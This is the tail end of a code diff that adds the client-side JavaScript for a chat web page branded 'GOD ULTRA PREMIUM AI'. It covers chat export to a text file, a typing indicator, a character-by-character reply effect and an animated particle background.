+    const blob = new Blob([messages.join('\n\n')], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `god_chat_${new Date().toISOString().slice(0,19)}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast("Chat exported!");
+}
+
+function showTyping(text = "GOD is typing") {
+    const typingDiv = document.createElement('div');
+    typingDiv.className = 'msg ai typing typing-dots';
+    typingDiv.innerHTML = `<i class="fas fa-brain" style="margin-right: 8px; color: var(--accent);"></i> ${text}`;
+    typingDiv.id = "typing";
+    chatBox.appendChild(typingDiv);
+    chatBox.scrollTop = chatBox.scrollHeight;
+}
+
+function removeTyping() {
+    const typingDiv = document.getElementById("typing");
+    if (typingDiv) typingDiv.remove();
+}
+
+function typeWriter(reply) {
+    const aiDiv = document.createElement('div');
+    aiDiv.className = 'msg ai';
+    chatBox.appendChild(aiDiv);
+    let i = 0;
+    function type() {
+        if (i < reply.length) {
+            if (i === 0) aiDiv.innerHTML = `<i class="fas fa-brain" style="margin-right: 8px; color: var(--accent);"></i> <span></span><div class="msg-actions"><button class="msg-action" onclick="copyText(this)"><i class="fas fa-copy"></i></button></div><div style="font-size: 9px; color: var(--text-muted); margin-top: 5px;">${new Date().toLocaleTimeString()}</div>`;
+            const span = aiDiv.querySelector('span');
+            span.innerHTML += reply.charAt(i);
+            i++;
+            chatBox.scrollTop = chatBox.scrollHeight;
+            setTimeout(type, 20);
+        }
+    }
+    type();
+}
+
+// ========== BACKGROUND ANIMATION ==========
+(function() {
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    let W, H, particles = [];
+    
+    function resize() { 
+        W = canvas.width = window.innerWidth; 
+        H = canvas.height = window.innerHeight; 
+    }
+    window.addEventListener('resize', resize);
+    resize();
+    
+    class Particle {
+        constructor() { this.reset(); }
+        reset() { 
+            this.x = Math.random() * W; 
+            this.y = Math.random() * H; 
+            this.vx = (Math.random() - 0.5) * 0.3; 
+            this.vy = (Math.random() - 0.5) * 0.3; 
+            this.r = Math.random() * 2 + 1; 
+            this.color = `hsl(${Math.random() * 30 + 340}, 100%, 50%)`;
+        }
+        move() { 
+            this.x += this.vx; 
+            this.y += this.vy; 
+            if (this.x < 0 || this.x > W) this.vx *= -1;
+            if (this.y < 0 || this.y > H) this.vy *= -1;
+        }
+        draw() { 
+            ctx.beginPath(); 
+            ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2); 
+            ctx.fillStyle = this.color;
+            ctx.fill(); 
+        }
+    }
+    for (let i = 0; i < 100; i++) particles.push(new Particle());
+    
+    function animate() {
+        ctx.clearRect(0, 0, W, H);
+        particles.forEach(p => { p.move(); p.draw(); });
+        requestAnimationFrame(animate);
+    }
+    animate();
+})();
+
+console.log('🎯 GOD ULTRA PREMIUM AI Active | Session: ' + sessionId);
+</script>
+</body>
+</html>
